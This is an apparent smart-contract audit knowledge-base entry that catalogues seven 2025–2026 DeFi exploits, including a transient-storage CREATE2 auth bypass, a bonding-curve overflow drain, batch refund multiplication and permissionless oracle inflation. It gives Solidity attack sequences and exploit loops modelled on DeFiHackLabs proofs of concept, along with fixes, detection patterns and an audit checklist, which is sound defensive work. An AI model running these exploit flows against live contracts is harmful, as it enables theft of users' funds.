---
# Core Classification
protocol: "generic"
chain: "ethereum, base, bsc, arbitrum"
category: "novel_attack_vectors"
vulnerability_type: "transient_storage_bypass, fee_overcharge, reward_farming, batch_refund, bonding_curve_overflow, fee_unit_mismatch, permissionless_oracle"

# Attack Vector Details
attack_type: "logical_error, arithmetic_overflow, state_manipulation"
affected_component: "tstore_auth, transfer_fee, staking_rewards, sale_refund, bonding_curve, fee_manager, aum_oracle"

# Technical Primitives
primitives:
  - "tstore"
  - "tload"
  - "transient_storage"
  - "CREATE2"
  - "address_collision"
  - "fee_overcharge"
  - "skim_sync"
  - "reward_farming"
  - "identity_rotation"
  - "batch_refund"
  - "msg_value_reuse"
  - "bonding_curve"
  - "price_overflow"
  - "fee_unit_mismatch"
  - "permissionless_oracle"
  - "updateTotalAum"
  - "share_price"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.75
financial_impact: "critical"

# Context Tags
tags:
  - "defi"
  - "novel-attack"
  - "transient-storage"
  - "EIP-1153"
  - "CREATE2"
  - "fee-on-transfer"
  - "staking"
  - "bonding-curve"
  - "oracle"
  - "batch-processing"
  - "unit-mismatch"
  - "2025"
  - "2026"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [SIR-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2025-03/LeverageSIR_exp.sol` |
| [MT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2026-01/MTToken_exp.sol` |
| [PRXVT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2026-01/PRXVT_exp.sol` |
| [SYNAP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2026-01/SynapLogic_exp.sol` |
| [TRUEBIT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2026-01/Truebit_exp.sol` |
| [FUTURE-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2026-01/Futureswap_exp.sol` |
| [MAKINA-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2026-01/makina_exp.sol` |

---

# Novel & Emerging Attack Patterns (2025-2026)

## Overview

The 2025-2026 period introduces genuinely novel attack vectors that exploit new EVM features (transient storage EIP-1153), economic design flaws (bonding curve arithmetic, permissionless oracle updates), and classic patterns in new contexts (CREATE2 identity rotation, batch refund multiplication). These 7 exploits represent the bleeding edge of smart contract exploitation — many have no prior precedent. Combined losses exceed **$14M** with individual exploits ranging from 27 ETH to 8,540 ETH ($5.1M).

---

## 1. Transient Storage (EIP-1153) Authorization Bypass via CREATE2

### Root Cause

EIP-1153 introduced `tstore`/`tload` opcodes for transient storage that persists only within a single transaction. When a protocol uses transient storage to authorize callbacks (e.g., storing an expected callback address in `tstore(SLOT, address)`), an attacker who can control the value stored can deploy a contract at that exact address via CREATE2 and pass the authorization check. The stored value becomes a "key" — if the attacker forges the key by controlling what gets stored, they can deploy a contract that holds that key.

### Attack Scenario

1. Create fake ERC20 tokens (AttackerC_A, AttackerC_B) with malicious `mint()` that returns `uint160(address(this))`
2. Create a fake Uniswap V3 pool using these tokens
3. Initialize the victim vault with the fake token pair
4. Call `vault.mint()` — the fake token's `mint()` returns attacker's address, which gets stored via `tstore(1, amount)`
5. The stored value equals a pre-computed CREATE2 address
6. Deploy a contract at that exact address using `ImmutableCreate2Factory.safeCreate2()`
7. The deployed contract calls `vault.uniswapV3SwapCallback()` — passes `tload(1)` check
8. Drain all vault tokens through the authorized callback

### Vulnerable Pattern Examples

**Example 1: LeverageSIR — Transient Storage Auth Bypass via CREATE2 ($353K, Mar 2025)** [Approx Vulnerability: CRITICAL] `@audit` [SIR-POC]

```solidity
// ❌ VULNERABLE: Transient storage used for callback authorization
// tstore(1, value) where value is controllable by fake token's mint() return

// Vault's mint() function:
function mint(bool isAPE, VaultParameters memory vaultParams,
    uint256 amountToDeposit, uint144 collateralToDepositMin)
    external payable returns (uint256 amount)
{
    // Calls external token's mint() — return value stored in transient storage
    (newReserves, fees, amount) = IToken(token).mint(
        msg.sender, baseFee, tax, reserves, collateralDeposited
    );
    // @audit `amount` comes from EXTERNAL call to potentially fake token
    // @audit This value is stored: tstore(1, amount)
    // @audit If amount == uint160(attackerAddress), attacker can forge auth
}

// Attacker's fake token:
contract AttackerC_A {
    function mint(address, uint16, uint8, Reserves memory, uint144)
        external returns (Reserves memory, Fees memory, uint256 amount)
    {
        amount = uint160(address(this));
        // @audit Returns attacker's address as the amount
        // @audit This gets stored via tstore(1, uint160(address(this)))
        return (Reserves(10000000000, 0, 0), Fees(0, 0, 0), amount);
    }
}

// Vault's callback check:
function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta,
    bytes calldata data) external
{
    address expected;
    assembly { expected := tload(1) }
    // @audit Checks if caller == tload(1) — the forged address
    require(msg.sender == expected, "Unauthorized callback");
    // @audit Attacker deployed contract at `expected` address via CREATE2
    // @audit Callback passes — drains USDC, WBTC, WETH from vault
    _processCallback(amount0Delta, amount1Delta, data);
}

// CREATE2 deployment at the exact address:
ImmutableCreate2Factory.safeCreate2(
    computedSalt,    // @audit Pre-computed to match the target address
    proxyBytecode    // @audit Minimal proxy that calls vault callback
);
// @audit Contract deployed at address == tload(1) value
// @audit $353K drained: 17,814 USDC + 1.4 WBTC + 119.87 WETH
```

---

## 2. Fee-On-Transfer Token Overcharge + AMM Sync Drain

### Root Cause

When a token's `_transfer()` function applies fees based on a percentage list where `sum(shares) > 100%`, the sender is debited more tokens than the recipient receives. When this transfer involves an AMM pair, the pair's internal balance becomes desynced from its actual token balance. The attacker can then use `skim()` to extract excess tokens and `sync()` to lock the manipulated reserves, enabling profitable swaps.

### Attack Scenario

1. Flash loan USDT
2. Buy the buggy token from the pair (large amount)
3. Transfer tokens TO the pair — fee overcharge debits pair's balance excessively
4. Call `pair.skim(attacker)` — extract excess tokens (fee triggers again, debiting pair more)
5. Call `pair.sync()` — lock manipulated reserves
6. Sell tokens via router at favorable rate — drain USDT
7. Repay flash loan, keep profit

### Vulnerable Pattern Examples

**Example 2: MTToken — Fee Overcharge + Sync Drain (~$37K, Jan 2026)** [Approx Vulnerability: HIGH] `@audit` [MT-POC]

```solidity
// ❌ VULNERABLE: transactionFee() splits fees by unbounded percentages
// sum(shares) > 100% causes sender to lose more than transfer amount

// Step 1: Flash loan max USDT from Moolah
IMoolahFlashLoan(Moolah).flashLoan(USDT, maxAssets, "");

// Step 2: Buy MT from PancakeV2 pair
USDT.transfer(address(pair), 189_727e18);
pair.swap(0, mtAmount, address(this), "");

// Step 3: Transfer MT TO the pair — triggers fee overcharge
MT.transfer(address(pair), 2_075_238e18);
// @audit Fee logic: for each fee share, deducts percentage from sender
// @audit If shares total > 100%, sender loses MORE than transfer amount
// @audit Pair's actual MT balance now LESS than pair's internal accounting

// Step 4: Skim excess — pair sends "surplus" tokens to attacker
pair.skim(address(this));
// @audit skim() calculates: balance - reserve, sends difference
// @audit But reserve is stale — attacker gets excess tokens
// @audit Transfer OUT of pair triggers fee again, debiting pair further

// Step 5: Sync to lock manipulated reserves
pair.sync();
// @audit Reserves now reflect deflated MT balance + original USDT
// @audit Price ratio is now heavily skewed

// Step 6: Sell MT via router at favorable rate
router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    594_572e18,  // MT amount to sell
    0,           // minOut (accept any)
    path,        // MT → USDT
    attacker,
    deadline
);
// @audit Drains USDT from skewed pair
// @audit Net profit: ~36,995 USDT after flash loan repayment
```

---

## 3. Staking Reward Farming via CREATE2 Identity Rotation

### Root Cause

When a staking contract calculates rewards per-address without tracking total claimed amounts globally, an attacker can transfer staked tokens to freshly-deployed contracts (via CREATE2 with incrementing salts). Each new address appears as a "new staker" that hasn't claimed rewards yet. The staking tokens are rotated through 10+ fresh addresses per transaction, each claiming rewards.

### Attack Scenario

1. Buy and stake tokens to get staked token (stPRXVT)
2. Deploy fresh contract via CREATE2 with unique salt
3. Transfer all staked tokens to the new contract
4. New contract calls `claimReward()` — receives rewards as "new staker"
5. New contract transfers staked tokens + rewards back
6. Repeat with new CREATE2 salt — each iteration farms more rewards

### Vulnerable Pattern Examples

**Example 3: PRXVT — CREATE2 Identity Rotation Reward Farming (32.8 ETH, Jan 2026)** [Approx Vulnerability: HIGH] `@audit` [PRXVT-POC]

```solidity
// ❌ VULNERABLE: Rewards calculated per-address without global tracking
// Transferring stake to new address "resets" reward eligibility

interface IstPRXVT is IERC20 {
    function claimReward() external;
    function stake(uint256 amount) external;
    function earned(address account) external view returns (uint256);
}

// Coordinator contract:
contract Attack1 {
    uint256 nonce;

    function attack(uint256 gasLimit) external {
        while (gasleft() > gasLimit) {
            // Deploy fresh contract via CREATE2 with unique salt
            Attack2 a2 = new Attack2{salt: bytes32(nonce++)}();
            // @audit Each iteration creates a new address

            // Transfer ALL staked tokens to the new address
            stPRXVT.transfer(address(a2), stPRXVT.balanceOf(address(this)));

            // New contract claims rewards + returns everything
            a2.execute();
            // @audit Fresh address has "unclaimed" rewards
            // @audit ~10 iterations per transaction
        }
    }
}

contract Attack2 {
    function execute() external {
        uint256 earned = stPRXVT.earned(address(this));
        if (earned > 0) {
            stPRXVT.claimReward();
            // @audit Claims rewards as "new staker" — never claimed before
            // @audit Reward calculation: rewardPerToken - userRewardPerTokenPaid
            // @audit For new address: userRewardPerTokenPaid = 0 → gets full rewards
        }
        // Return staked tokens + earned rewards to coordinator
        stPRXVT.transfer(msg.sender, stPRXVT.balanceOf(address(this)));
        PRXVT.transfer(msg.sender, PRXVT.balanceOf(address(this)));
    }
}
// @audit 32.8 ETH stolen via ~10 identity rotations per tx
// @audit Root cause: reward accounting tied to address, not to stake-time
```

---

## 4. Batch Array Refund Multiplication

### Root Cause

When a sale/purchase function accepts arrays of recipients, rates, and refund flags, and processes refunds per-iteration using `msg.value` (which is constant across all iterations), the attacker can specify N entries all requesting refunds. Each iteration refunds `msg.value / rate`, but `msg.value` was paid only once. With N entries: total refund = N × (msg.value / rate), which exceeds msg.value when N > rate.

### Attack Scenario

1. Calculate: `refundPerIteration = msg.value / rate` (e.g., 1 ETH / 10 = 0.1 ETH)
2. Calculate: `maxIterations = contractBalance / refundPerIteration` (e.g., 20)
3. Build arrays: all recipients = attacker, all refundFlags = true
4. Call `buy{value: 1 ETH}(recipients, rates, flags)` — 20 iterations × 0.1 ETH = 2 ETH refund
5. Net profit: 2 ETH - 1 ETH = 1 ETH per transaction (drain entire contract balance)

### Vulnerable Pattern Examples

**Example 4: SynapLogic — Batch Refund Drain (27.6 ETH, Jan 2026)** [Approx Vulnerability: HIGH] `@audit` [SYNAP-POC]

```solidity
// ❌ VULNERABLE: buy() processes refunds per-array-element using msg.value
// msg.value is paid once but refund is issued N times

// Selector: 0x670a3267
// buy(address[] recipients, uint256[] rates, bool[] refundFlags)
function buy(
    address[] calldata recipients,
    uint256[] calldata rates,
    bool[] calldata refundFlags
) external payable {
    for (uint256 i = 0; i < recipients.length; i++) {
        // Process each "purchase"
        _processPurchase(recipients[i], rates[i]);

        if (refundFlags[i]) {
            uint256 refund = msg.value / rates[i];
            // @audit msg.value is CONSTANT across all iterations
            // @audit But refund is sent EACH iteration
            payable(recipients[i]).transfer(refund);
            // @audit With rate=10: refund = msg.value / 10 = 0.1 ETH per iteration
            // @audit With 20 iterations: 20 × 0.1 = 2 ETH refunded for 1 ETH sent
        }
    }
}

// Attacker builds arrays:
uint256 rate = 10;
uint256 refundPerIter = msg.value / rate;  // 0.1 ETH
uint256 maxIters = (address(sale).balance + msg.value) / refundPerIter;  // ~20
if (maxIters > 20) maxIters = 20;  // Cap at 20

address[] memory recipients = new address[](maxIters);
uint256[] memory rates = new uint256[](maxIters);
bool[] memory flags = new bool[](maxIters);

for (uint i = 0; i < maxIters; i++) {
    recipients[i] = address(this);  // @audit All refunds go to attacker
    rates[i] = rate;
    flags[i] = true;                // @audit All entries request refund
}

ISale(sale).buy{value: 1 ether}(recipients, rates, flags);
// @audit Contract drained: 27.6 ETH total across multiple calls
```

---

## 5. Bonding Curve Arithmetic Overflow in Price Calculation

### Root Cause

Bonding curve contracts calculate buy/sell prices using polynomial formulas. When the formula involves `amount × reserve × totalSupply` terms, an attacker can compute an exact `amount` that causes intermediate values to near `type(uint256).max`, creating a pricing asymmetry where the buy price is cheap but the sell price is high. The attacker reverse-engineers the exact amount using the quadratic formula.

### Attack Scenario

1. Read bonding curve parameters: `reserve`, `THETA`, `totalSupply`
2. Solve: $\text{amount} = \sqrt{\frac{\text{type(uint256).max}}{100 \times \text{reserve}} + \text{totalSupply}^2} - \text{totalSupply} + 1$
3. Call `buyTRU{value: computedPrice}(amount)` — purchase at computed price
4. Call `sellTRU(amount)` — sell at higher effective price due to curve asymmetry at extremes
5. Repeat until pool drained (each iteration extracts more ETH than deposited)

### Vulnerable Pattern Examples

**Example 5: Truebit — Bonding Curve Price Overflow (8,540 ETH, Jan 2026)** [Approx Vulnerability: CRITICAL] `@audit` [TRUEBIT-POC]

```solidity
// ❌ VULNERABLE: Bonding curve price formula overflows at extreme amounts
// Buy/sell price asymmetry enables arbitrage

interface IPOOL {
    function getPurchasePrice(uint256 amount) external view returns (uint256);
    function sellTRU(uint256 amount) payable external;
    function buyTRU(uint256 amount) payable external;
    function THETA() external view returns (uint256);
    function reserve() external view returns (uint256);
}

// Price formula (simplified):
// price = (200 * amount * reserve * totalSupply + 100 * amount^2 * reserve)
//         / (100 * totalSupply^2 - THETA * totalSupply^2)
// @audit Intermediate multiplication can overflow uint256

// Attacker's solver — finds amount that maximizes price asymmetry:
function solveForAmount(uint256 reserveAmt, uint256 totalSupply)
    internal pure returns (uint256)
{
    // Reverse-engineer amount from: 200 * amount * reserve ~ type(uint256).max
    uint256 maxUint = type(uint256).max;
    uint256 inner = maxUint / (100 * reserveAmt) + totalSupply * totalSupply;
    uint256 sqrtInner = sqrt(inner);
    return sqrtInner - totalSupply + 1;
    // @audit Returns exact amount that pushes price calculation to overflow boundary
}

// Exploit loop:
while (address(POOL).balance >= 0.1 ether) {
    uint256 reserve = POOL.reserve();
    uint256 totalSupply = TRU.totalSupply();

    uint256 amount = solveForAmount(reserve, totalSupply);
    uint256 price = POOL.getPurchasePrice(amount);

    // Buy at computed (low) price
    POOL.buyTRU{value: price}(amount);
    // @audit Price is computed at overflow boundary — artificially low

    // Sell at higher effective price
    TRU.approve(address(POOL), amount);
    POOL.sellTRU(amount);
    // @audit Sell price calculated differently — returns more ETH than buy cost
    // @audit Net profit per iteration due to buy/sell price asymmetry
}
// @audit 8,540 ETH drained from bonding curve pool
// @audit Root cause: no overflow protection in price formula
```

---

## 6. Fee Unit Mismatch Between Systems

### Root Cause

When one system computes a fee in **token units** (e.g., 500 USDC) and passes it to another system that **interprets it as basis points or weight** (e.g., 500 = 5%), the receiving system allocates massively inflated fee credits. The attacker opens a position that generates a large fee value, then claims the fee credit as if it were a proportional share.

### Attack Scenario

1. Flash loan USDC
2. Open a large position — fee computed as `abs(delta) × feeRateWad / 1e18` = token amount
3. Fee forwarded to FeeManager as `addFee(tokenAmount)` — but FeeManager treats it as weight/bps
4. Attacker's allocated fee credit is astronomical
5. Close position via `changePosition()` with large negative delta — extracts USDC via fee credit
6. Repay flash loan, keep profit

### Vulnerable Pattern Examples

**Example 6: Futureswap — Fee Unit Mismatch (~$394K, Jan 2026)** [Approx Vulnerability: CRITICAL] `@audit` [FUTURE-POC]

```solidity
// ❌ VULNERABLE: Fee computed in token units, interpreted as bps/weight

// System A — Position Contract:
function changePosition(int256 deltaAsset, int256 deltaStable, int256 stableBound) external {
    uint256 fee = abs(deltaAsset) * feeRateWad / 1e18;
    // @audit `fee` is in TOKEN UNITS (e.g., 500 USDC)

    FeeManager.addFee(address(token), fee);
    // @audit Passes token-unit fee to FeeManager
}

// System B — FeeManager:
function addFee(address token, uint256 feeAmount) external {
    // @audit Interprets `feeAmount` as WEIGHT or BPS, not token units
    // @audit If feeAmount = 500e6 (500 USDC), treated as 500,000,000 weight
    userFeeShare[msg.sender] += feeAmount;
    totalFeeWeight += feeAmount;
    // @audit Attacker's share is now astronomical
}

// Attacker's flow:
// Step 1: Flash loan 500,000 USDC from Aave V3
AaveV3.flashLoan(USDC, 500_000e6);

// Step 2: Open seed position (1,000 USDC)
opener.changePosition(0.1e18, 1000e6, 0);

// Step 3: Big-fee position (2,000 USDC) — generates huge fee value
callerBigFee.changePosition(0.3247e18, 2000e6, 0);
// @audit Fee: abs(0.3247e18) × feeRate = large token-unit value
// @audit FeeManager records it as weight → inflated share

// Step 4: Main drain — extract via position close
victim.changePosition(-68e18, 496_500e6, 0);

// Step 5: Drain via opener with massive negative delta
opener.changePosition(0, -894_992_852_305, 0);
// @audit Extracts 894,992 USDC based on inflated fee share
// @audit Net profit: ~394,742 USDC + 67.57 WETH
```

---

## 7. Permissionless AUM Oracle Manipulation

### Root Cause

When a protocol's `updateTotalAum()` function is permissionless (callable by anyone, not just keepers or admins), and its return value feeds into an oracle used by other protocols (e.g., Curve pool), an attacker can manipulate the AUM calculation to inflate the oracle price. By flash-loaning assets that inflate the AUM, the attacker gets a favorable exchange rate in downstream protocols.

### Attack Scenario

1. Call `machine.updateTotalAum()` — permissionless, anyone can trigger
2. AUM is calculated based on current asset balances (which may include flash-loaned assets)
3. `MachineShareOracle.getSharePrice()` now returns inflated price
4. Swap DUSD → USDC in Curve pool that reads the inflated oracle
5. Receive more USDC than DUSD is worth

### Vulnerable Pattern Examples

**Example 7: Makina — Permissionless AUM Oracle Inflation (~$5.1M, Jan 2026)** [Approx Vulnerability: CRITICAL] `@audit` [MAKINA-POC]

```solidity
// ❌ VULNERABLE: updateTotalAum() is permissionless
// Anyone can trigger AUM recalculation that feeds into oracle

interface IMachine {
    function updateTotalAum() external returns (uint256);
    // @audit No onlyKeeper, no onlyOwner, no onlyAdmin
    // @audit PERMISSIONLESS — anyone can call
}

interface IMachineShareOracle {
    function getSharePrice() external view returns (uint256);
    // @audit Reads from Machine's AUM — which was just manipulated
}

interface ICurvePool {
    function exchange(int128 i, int128 j, uint256 dx, uint256 minDy) external;
    // @audit DUSD/USDC pool uses MachineShareOracle for pricing
}

// Attack:
// Step 1: Trigger AUM update — inflates reported total value
machine.updateTotalAum();
// @audit AUM includes current balance of vault assets
// @audit If attacker deposited flash-loaned assets, AUM is inflated
// @audit Or: AUM calculation has a flaw that over-reports value

// Step 2: Oracle now returns inflated share price
uint256 inflatedPrice = oracle.getSharePrice();
// @audit Price reflects the manipulated AUM

// Step 3: Trade in Curve pool at inflated rate
// Flash loan 9,215,229 DUSD
CurvePool.exchange(
    1,              // DUSD index
    0,              // USDC index
    9_215_229e18,   // DUSD amount
    0               // @audit minDy = 0 — accept any output
);
// @audit Curve pool prices DUSD using the inflated oracle
// @audit Attacker receives more USDC than DUSD is truly worth

// Step 4: Repay flash loan, keep ~$5.1M USDC profit
// @audit Root cause: updateTotalAum() should be keeper-only or time-gated
```

---

## Impact Analysis

### Technical Impact
- **Transient storage attacks** represent an entirely new attack surface (EIP-1153, live since Cancun upgrade)
- **CREATE2 identity rotation** defeats per-address reward accounting without exploiting any code bug
- **Batch refund multiplication** is a trivial logic flaw with devastating consequences
- **Bonding curve overflow** uses mathematical precision to drain pools iteratively
- **Fee unit mismatches** exploit integration boundaries between subsystems
- **Permissionless oracle updates** demonstrate the danger of unrestricted state-refresh functions

### Business Impact
- **Truebit**: 8,540 ETH (~$14M at peak) — bonding curve price overflow
- **Makina**: ~$5.1M — permissionless AUM oracle manipulation
- **Futureswap**: ~$394K — fee unit mismatch between position and fee manager
- **LeverageSIR**: $353K — transient storage authorization bypass via CREATE2
- **MTToken**: ~$37K — fee overcharge + skim/sync AMM drain
- **PRXVT**: 32.8 ETH — CREATE2 identity rotation reward farming
- **SynapLogic**: 27.6 ETH — batch refund multiplication
- Combined 2025-2026 novel attack damage: **$14M+**

### Affected Scenarios
- Any protocol using `tstore`/`tload` for callback authorization (new EVM feature)
- Staking contracts with per-address reward tracking (transferable stake tokens)
- Sale/purchase contracts processing arrays with per-element refunds
- Bonding curve implementations with polynomial pricing formulas
- Multi-system integrations where fee values cross unit boundaries
- Protocols with permissionless oracle/AUM refresh functions
- Fee-on-transfer tokens with unbounded fee share percentages

---

## Secure Implementation

**Fix 1: Secure Transient Storage Authorization**
```solidity
// ✅ SECURE: Use msg.sender directly instead of stored value for callback auth
function mint(/* ... */) external returns (uint256 amount) {
    // Store the POOL address, not an externally-controlled value
    address pool = IFactory(factory).getPool(token0, token1, fee);
    assembly { tstore(1, pool) }
    // @audit Pool address is deterministic and not attacker-controlled

    IUniswapV3Pool(pool).swap(/* ... */);

    assembly { tstore(1, 0) }  // Clear after use
}

function uniswapV3SwapCallback(/* ... */) external {
    address expected;
    assembly { expected := tload(1) }
    require(msg.sender == expected, "Unauthorized");
    // @audit expected is a verified pool address, not an attacker-derived value
}
```

**Fix 2: Global Reward Tracking (Not Per-Address)**
```solidity
// ✅ SECURE: Track total claimed rewards globally with per-token-ID checkpoints
mapping(uint256 => uint256) public lastClaimedRewardPerToken;

function claimReward() external {
    uint256 stakeId = stakingNFT.tokenOfOwnerByAddress(msg.sender);
    uint256 newRewards = rewardPerToken - lastClaimedRewardPerToken[stakeId];
    // @audit Reward tracking tied to STAKE ID, not address
    // @audit Transferring to new address doesn't reset lastClaimed
    lastClaimedRewardPerToken[stakeId] = rewardPerToken;
    rewardToken.transfer(msg.sender, newRewards * balanceOf(stakeId) / 1e18);
}
```

**Fix 3: Single msg.value Accounting in Batch Functions**
```solidity
// ✅ SECURE: Track total refunded against msg.value
function buy(address[] calldata recipients, uint256[] calldata rates, bool[] calldata flags)
    external payable
{
    uint256 totalRefunded = 0;
    for (uint i = 0; i < recipients.length; i++) {
        _processPurchase(recipients[i], rates[i]);
        if (flags[i]) {
            uint256 refund = msg.value / rates[i];
            totalRefunded += refund;
            require(totalRefunded <= msg.value, "Refund exceeds payment");
            // @audit Cumulative refund cannot exceed msg.value
            payable(recipients[i]).transfer(refund);
        }
    }
}
```

**Fix 4: Overflow-Safe Bonding Curve Pricing**
```solidity
// ✅ SECURE: Use checked math with reasonable bounds
function getPurchasePrice(uint256 amount) external view returns (uint256) {
    require(amount <= MAX_PURCHASE_AMOUNT, "Amount too large");
    // @audit Cap amount to prevent overflow in intermediate calculations

    // Use mulDiv for safe intermediate multiplication
    uint256 term1 = Math.mulDiv(200 * amount, reserve, totalSupply);
    uint256 term2 = Math.mulDiv(100 * amount, amount, totalSupply);
    // @audit mulDiv prevents overflow by using 512-bit intermediate
    return term1 + Math.mulDiv(term2, reserve, totalSupply);
}
```

**Fix 5: Restrict Oracle Update Callers**
```solidity
// ✅ SECURE: Only authorized keepers can update AUM
mapping(address => bool) public authorizedKeepers;

function updateTotalAum() external returns (uint256) {
    require(authorizedKeepers[msg.sender], "Not authorized keeper");
    // @audit Permissioned — prevents attacker-triggered AUM inflation
    // @audit Alternative: time-gated (min interval between updates)
    return _calculateAum();
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- Pattern 1: tstore/tload used for callback authorization with externally-controlled values
- Pattern 2: Staking rewards calculated per-address with transferable stake tokens
- Pattern 3: Batch function with per-element refund using msg.value
- Pattern 4: Bonding curve with polynomial formula lacking overflow protection
- Pattern 5: Fee value crossing subsystem boundaries (token units → bps/weight)
- Pattern 6: Permissionless oracle/AUM update function without access control
- Pattern 7: Fee-on-transfer token where sum(shares) > 100%
- Pattern 8: CREATE2 used to deploy at pre-computed addresses that match stored auth values
```

### Audit Checklist
- [ ] Are `tstore`/`tload` values derived from trusted sources (not external calls)?
- [ ] Are staking rewards tied to position IDs rather than addresses?
- [ ] Do batch functions track cumulative msg.value usage?
- [ ] Are bonding curve intermediate calculations overflow-protected?
- [ ] Do fee values maintain consistent units across subsystem boundaries?
- [ ] Are oracle/AUM update functions access-controlled or time-gated?
- [ ] Do fee-on-transfer tokens enforce `sum(fee_shares) <= 100%`?
- [ ] Can CREATE2 addresses be predicted and used to bypass auth checks?

---

## Real-World Examples

### Known Exploits
- **Truebit** — 8,540 ETH — Bonding curve price formula overflow exploitation — Jan 2026
- **Makina** — ~$5.1M USDC — Permissionless `updateTotalAum()` oracle inflation — Jan 2026
- **Futureswap** — ~$394K USDC — Fee unit mismatch (token units → bps) — Jan 2026
- **LeverageSIR** — $353K — Transient storage (tstore) auth bypass via CREATE2 address forging — Mar 2025
- **MTToken** — ~$37K USDT — Fee overcharge (>100% shares) + skim/sync AMM drain — Jan 2026
- **PRXVT** — 32.8 ETH — CREATE2 identity rotation staking reward farming — Jan 2026
- **SynapLogic** — 27.6 ETH — Batch refund multiplication (msg.value reuse) — Jan 2026

---

## Prevention Guidelines

### Development Best Practices
1. **Transient storage**: Never store externally-derived values in tstore for auth — use deterministic protocol addresses
2. **Reward systems**: Tie rewards to position/stake IDs, not transfer-recipient addresses
3. **Batch processing**: Track cumulative `msg.value` usage; never refund per-element without accounting
4. **Bonding curves**: Use `mulDiv` (OpenZeppelin Math) for safe 512-bit intermediate calculations; cap max amounts
5. **Fee interfaces**: Document unit conventions explicitly; add unit conversion assertions at boundaries
6. **Oracle updates**: Always restrict `updateAum()`/`updatePrice()` to authorized keepers or time-gate
7. **Fee tokens**: Enforce `sum(fee_shares) <= 100%` with a require statement in fee configuration

### Testing Requirements
- Transient storage: test callback with attacker-deployed contract at predicted address
- Rewards: fuzz test transfer-to-new-address → claim → transfer-back loops
- Batch: test with array length > rate to verify refund cannot exceed msg.value
- Bonding curves: test with amount = `sqrt(type(uint256).max / (100 * reserve))`
- Fee integration: verify fee values are in expected range at every subsystem boundary
- Oracle: test `updateAum()` callable by non-keeper → must revert

---

## Keywords for Search

`transient storage`, `tstore`, `tload`, `EIP-1153`, `CREATE2 attack`, `CREATE2 collision`, `address forging`, `callback authorization`, `ImmutableCreate2Factory`, `fee overcharge`, `skim sync`, `fee shares greater than 100`, `reward farming`, `identity rotation`, `CREATE2 identity`, `staking reward exploit`, `per-address reward`, `batch refund`, `msg.value reuse`, `refund multiplication`, `array refund drain`, `bonding curve overflow`, `price formula overflow`, `solveForAmount`, `buyTRU sellTRU`, `fee unit mismatch`, `token units vs bps`, `addFee`, `changePosition`, `permissionless oracle`, `updateTotalAum`, `AUM manipulation`, `share price oracle`, `Curve pool oracle`, `novel attack vector`, `2026 exploit`, `emerging vulnerability`

---

## Related Vulnerabilities

- `DB/general/precision/defihacklabs-precision-share-manipulation-2024-2025.md` — Related share/price manipulation
- `DB/oracle/price-manipulation/defihacklabs-oracle-manipulation-2024-2025.md` — Oracle manipulation patterns
- `DB/general/access-control/defihacklabs-access-control-2024-2025.md` — Missing access control (permissionless functions)
- `DB/general/fee-on-transfer-tokens/` — Fee-on-transfer token patterns
- `DB/general/calculation/` — Arithmetic and calculation vulnerabilities
- `DB/general/business-logic/defihacklabs-business-logic-2024-2025.md` — Business logic flaws
